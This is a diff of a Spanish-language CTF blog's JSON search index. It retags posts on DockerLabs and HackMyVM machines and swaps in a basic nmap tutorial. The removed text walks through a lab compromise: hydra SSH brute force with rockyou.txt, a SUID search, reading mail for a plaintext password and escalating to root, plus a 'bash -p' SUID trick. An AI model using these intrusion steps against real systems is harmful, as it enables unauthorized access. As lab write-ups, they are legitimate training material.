writeupsUna vez editado esperemos a que lo ejecute y con el siguiente comando ejecutamos el binario modificado de permisos fraudulentamente.bash -p   Jamas consegui que se ejecutara el script pienso que algo fallo ni idea , bo obstante la gente la ahce de ese modo.Gracias por leer."
+  },
+  
+  {
     "title": "Capypenguin , DOCKERLABS",
     "url": "/posts/capypenguin/",
-    "categories": "",
-    "tags": "",
+    "categories": "DockerLabs",
+    "tags": "cft, hacking, etico",
     "date": "2024-04-25 00:00:00 -0300",
     
 
@@ -21,7 +735,7 @@
     "title": "Nmap basico bien explicado",
     "url": "/posts/Nmap_basico/",
     "categories": "Software",
-    "tags": "cft, hacking, etico",
+    "tags": "herramientas",
     "date": "2024-04-25 00:00:00 -0300",
     
 
@@ -30,14 +744,14 @@
 
 
     
-    "snippet": "Este es un reto clasificado como de dificultad easymuy facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada...",
-    "content": "Este es un reto clasificado como de dificultad easymuy facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , explotacion de ssh por fuerza bruta , movimiento lateral entre usuarios y escalada de privelegios.HERRAMIENTAS Y RECURSOS USADOS  nmap  hydra  searchbinsEnumeracionComo al arrancar la maquina ya nos dice la ip , nos olvidamos de arp-scan , comprobamos la conexion con un ping.ping -c1 172.17.0.2Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 172.17.0.2 -oX puertosReporteObservamos el resultado y vemos que solo tiene el 22 y el 80 abiertos .Empecemos por revisar la web y nos encontramos con una web totalmente en blanco asi que directos a ver la fuente.Empezamos por un ataque de fuerza bruta contra el usario camilo porque contra camilo pq entiendo que el receptor del mail es un usario seguro de la maquina.hydra -l camilo -P rockyou.txt -vV 172.17.02 sshInfiltraciónAhora que ya tenemos todo listo pasamos a conectarnos a la maquina con el usario y la contraseña proporcionada por hydra.Escalada de privilegiosUna vez dentro listamos directorios importantes y tambien lo primero es ejecutar como de costumbre find y sudo que nos buscaran ficheros con permisos erroneos.find / -perm -4000 2&gt;/dev/nullsudo -lComo vemos ninguno de los dos comandos nos arroja luz pero recordemos lo que tenemos hasta ahora la web y los users y la web nos hablaba de juan y un correo a camilo.Momento de buscar el mail.cat /var/mail/camilo.txtAhi tenemos en texto plano la pass de juan , accedamossu juanUna vez como juan volvemos a usar sudo y find y esta vez tenemos positivo con ruby.sudo -lPobre pedro no pasamos por su cuenta , no nos va a dar acceso o si ya eres root.Gracias por leer"
+    "snippet": "Para comenzar, es esencial familiarizarse con algunos comandos básicos de Nmap. A continuación, se presenta una breve descripción de algunos de los más utilizados:nmap -A &lt;objetivo&gt;: Realiza ...",
+    "content": "Para comenzar, es esencial familiarizarse con algunos comandos básicos de Nmap. A continuación, se presenta una breve descripción de algunos de los más utilizados:nmap -A &lt;objetivo&gt;: Realiza un escaneo completo del objetivo especificado, incluyendo la detección del sistema operativo, la detección de servicios y la detección de versiones.nmap -p &lt;rango_de_puertos&gt; &lt;objetivo&gt;: Escanea un rango específico de puertos en el objetivo indicado.nmap -sT &lt;objetivo&gt;: Realiza un escaneo TCP SYN, útil para identificar hosts activos.nmap -sU &lt;objetivo&gt;: Realiza un escaneo UDP, útil para identificar hosts que ejecutan servicios UDP.nmap -v &lt;objetivo&gt;: Aumenta el nivel de verbosidad de la salida.Ejemplos de usoPara ilustrar el uso de Nmap, consideremos algunos ejemplos prácticos:Escaneo completo de un host:nmap -A 192.168.1.100Escaneo de un rango de puertos:nmap -p 1-1000 192.168.1.0/24Escaneo TCP SYN:nmap -sT 192.168.1.0/24Escaneo UDP:nmap -sU 192.168.1.0/24Escaneo detallado con verbosidad alta:nmap -v 192.168.1.100Uso de scriptsNmap ofrece la posibilidad de ampliar sus funcionalidades mediante la utilización de scripts. Estos scripts permiten realizar tareas específicas, como la detección de vulnerabilidades o la identificación de software instalado. Para utilizar scripts, es necesario contar con la biblioteca Nmap Scripting Engine (NSE).ConclusiónNmap se posiciona como una herramienta fundamental para la exploración de redes y la auditoría de seguridad en entornos Linux. Su amplia gama de comandos y la posibilidad de utilizar scripts la convierten en un recurso invaluable para profesionales de la informática y la seguridad. La comprensión de los conceptos básicos de Nmap y su aplicación práctica permiten obtener información crucial sobre la infraestructura de red y detectar posibles vulnerabilidades.Recursos adicionalesPágina oficial de Nmap: https://nmap.org/downloadDocumentación de Nmap: https://nmap.org/docs.htmlTutoriales de Nmap: https://www.freecodecamp.org/news/what-is-nmap-and-how-to-use-it-a-tutorial-for-the-greatest-scanning-tool-of-all-time/"
   },
   
   {
     "title": "Upload , DOCKERLABS",
     "url": "/posts/upload/",
-    "categories": "",
+    "categories": "DockerLabs",
     "tags": "cft, hacking, etico",
     "date": "2024-04-23 00:00:00 -0300",
     
@@ -54,7 +768,7 @@
   {
     "title": "Vacaciones , DOCKERLABS",
     "url": "/posts/vacaciones/",
-    "categories": "",
+    "categories": "DockerLabs",
     "tags": "cft, hacking, etico",
     "date": "2024-04-22 00:00:00 -0300",
     
@@ -88,8 +802,8 @@
   {
     "title": "Domain , DOCKERLABS",
     "url": "/posts/domain/",
-    "categories": "",
-    "tags": "cft, ,, hacking, ,, etico, ,",
+    "categories": "DockerLabs",
+    "tags": "cft, hacking, etico",
     "date": "2024-04-21 00:00:00 -0300",
     
 
@@ -105,8 +819,8 @@
   {
     "title": "Pyred , DOCKERLABS",
     "url": "/posts/pyred/",
-    "categories": "",
-    "tags": "",
+    "categories": "DockerLabs",
+    "tags": "cft, hacking, etico",
     "date": "2024-04-19 00:00:00 -0300",
     
 
@@ -122,7 +836,7 @@
   {
     "title": "Alzheimer, HACKMYVM",
     "url": "/posts/alzheimer/",
-    "categories": "HackMyVM",
+    "categories": "HackMyVm",
     "tags": "",
     "date": "2023-11-27 00:00:00 -0300",
     
@@ -139,7 +853,7 @@
   {
     "title": "Hidden, HACKMYVM",
     "url": "/posts/hidden/",
-    "categories": "",
+    "categories": "HackMyVm",
     "tags": "",
     "date": "2023-11-26 00:00:00 -0300",
     
@@ -156,7 +870,7 @@
   {
     "title": "Twisted, HACKMYVM",
     "url": "/posts/twisted/",
-    "categories": "",
+    "categories": "HackMyVm",
     "tags": "",
     "date": "2023-11-25 00:00:00 -0300",
     
@@ -173,7 +887,7 @@
   {
     "title": "Method, HACKMYVM",
     "url": "/posts/method/",
-    "categories": "",
+    "categories": "HackMyVm",
     "tags": "",
     "date": "2023-11-16 00:00:00 -0300",
     
@@ -190,7 +904,7 @@
   {
     "title": "Friendly, HACKMYVM",
     "url": "/posts/friendly/",
-    "categories": "",
+    "categories": "HackMyVm",
     "tags": "",
     "date": "2023-11-16 00:00:00 -0300",
     
@@ -207,7 +921,7 @@
   {
     "title": "Drifting Blues 3 , HACKMYVM",
     "url": "/posts/driftingblues3/",
-    "categories": "",
+    "categories": "HackMyVm",
     "tags": "",
     "date": "2023-11-16 00:00:00 -0300",
     
